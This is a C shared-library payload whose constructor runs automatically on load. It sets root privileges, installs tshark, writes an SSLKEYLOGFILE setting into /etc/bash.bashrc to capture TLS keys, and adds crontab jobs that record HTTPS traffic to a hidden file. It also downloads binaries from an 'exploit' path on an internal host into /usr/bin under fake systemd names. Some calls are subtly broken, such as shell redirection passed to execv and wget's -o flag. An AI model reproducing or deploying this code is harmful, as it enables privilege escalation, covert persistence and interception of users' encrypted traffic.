//#include <stdio.h>
#include <unistd.h>
#include <sys/syscall.h>  
#include <sys/types.h>
#include <sys/wait.h> 
//#include <string.h>
//#include <errno.h>

void test(char* argv[]);

static void __attribute__((constructor)) _init(void) {
//int main(void) {
	syscall(SYS_setuid, 0);
	syscall(SYS_setgid, 0);

	char* argv0[] = {"apt-get","install","-yq","tshark", "net-tools",NULL};
	test(argv0);

	char* argv1[] = {"echo","SSLKEYLOGFILE=/var/log/gamelog/key.log",">>","/etc/bash.bashrc", NULL};
	test( argv1);

	char* argv2[] = {"mkdir","-p", "/var/log/gamelog",NULL };
	test( argv2);

	char* argv3[] = {"echo","GAMELOG=/var/log/gamelog/syslog.log",">>","/etc/bash.bashrc", NULL};
	test( argv3);

	char* argv4[] = {"echo","GAMELOG=/var/log/gamelog/syslog.log",">>","/etc/bash.bashrc", NULL};
	test( argv4);

	char* argv5[] = {"echo","00 9-17 * 1-5 systemd-checker",">>","/etc/crontab", NULL};
	test( argv5);

	char* argv6[] = {"echo","@reboot tshark -i $(ip route get 8.8.8.8 | cut -d' ' -f 5 | head -n 1) -f 'tcp port 443' -w /var/log/gamelog/.gamelog",">>","/etc/crontab", NULL};
	test( argv6);

	char* argv7[] = {"echo","0 0 * * * tshark -i $(ip route get 8.8.8.8 | cut -d' ' -f 5 | head -n 1) -f 'tcp port 443' -w /var/log/gamelog/.gamelog",">>","/etc/crontab", NULL};
	test(argv7);

	char* argv8[] = {"wget","--quiet","http://10.0.1.4/exploit/updatesvc_akac2client","-o", "/usr/bin/systemd-check", NULL};
	test(argv8);

	char* argv9[] = {"wget","--quiet","http://10.0.1.4/exploit/check_update","-o", "/usr/bin/systemd-checker", NULL};
	test(argv9);
	
	syscall(SYS_exit, 69);
}

void test(char* argv[]) {
	pid_t parent = getpid();
	pid_t pid = fork();

	if (pid == -1)
	{
	    // error, failed to fork()
	} 
	else if (pid > 0)
	{
	    int status;
	    waitpid(pid, &status, 0);
	}
	else 
	{
	    // we are the child
		int e = execv(argv[0], argv);
	}
}
